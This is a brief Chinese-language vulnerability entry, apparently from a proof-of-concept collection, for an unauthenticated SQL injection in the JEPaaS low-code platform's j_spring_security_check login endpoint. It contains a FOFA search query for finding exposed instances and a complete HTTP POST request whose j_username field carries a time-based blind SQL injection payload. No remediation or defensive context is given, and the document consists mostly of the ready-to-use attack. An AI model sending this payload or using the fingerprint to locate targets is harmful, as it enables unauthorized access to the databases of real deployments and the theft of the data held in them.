## JEPaaS低代码平台j_spring_security_check存在SQL注入漏洞

JEPaaS低代码平台j_spring_security_check存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用SQL注入漏洞获取数据库中的信息。

## fofa

```
body="/saas/saasYhAction!sendRandom.action"
```

## poc

```
POST /j_spring_security_check HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
 
j_username=');DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x--
```